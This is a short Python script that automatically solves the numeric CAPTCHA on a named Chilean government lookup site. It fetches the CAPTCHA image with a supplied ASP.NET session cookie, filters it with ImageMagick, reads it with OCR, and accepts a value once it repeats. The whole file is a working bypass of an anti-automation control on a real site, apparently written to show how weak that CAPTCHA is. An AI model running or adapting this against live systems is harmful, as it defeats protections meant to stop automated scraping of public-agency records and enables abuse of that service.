#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Author: Claudio Salazar <csalazar at spect dot cl>

from pytesser import *
import sys
import subprocess
import shlex
import requests
import uuid


NUMBER_OF_GUESSES = 3
NUMBER_OF_TRIES = 10

if len(sys.argv) != 2:
    print('Use: python %s <session_id>' % sys.argv[0])
    sys.exit(-1)

session_id = sys.argv[1]
guesses = {}
flag = True

for i in range(NUMBER_OF_TRIES):
    print '.',

    r = requests.get('http://consulta.servel.cl/jpgimage.aspx',
        cookies={'ASP.NET_SessionId': session_id}
    )

    #Save image
    fname = "/tmp/%s.jpg" % uuid.uuid4()
    with open(fname, 'wb') as f:
        f.write(r.raw.read(10000))

    #Apply DoG filter
    convert = shlex.split('convert {0} -normalize -morphology Convolve DoG:0,18,1 {0}'.format(fname))
    subprocess.call(convert)

    #Read with pytesser
    image = Image.open(fname)
    output = image_to_string(image)
    cracked_captcha = output[:3]

    #Delete image from filesystem
    subprocess.call(['rm', '-f', fname])

    try:
        #Check if it's a valid integer
        cc = int(cracked_captcha)
        if cracked_captcha in guesses:
            if guesses[cracked_captcha] == NUMBER_OF_GUESSES - 1:
                print '\n[+] CAPTCHA cracked: %s' % cracked_captcha
                flag = False
                break
            else:
                guesses[cracked_captcha] += 1
        else:
            guesses[cracked_captcha] = 1
    except:
        pass


if flag:
    print '\n[-] CAPTCHA not solved'
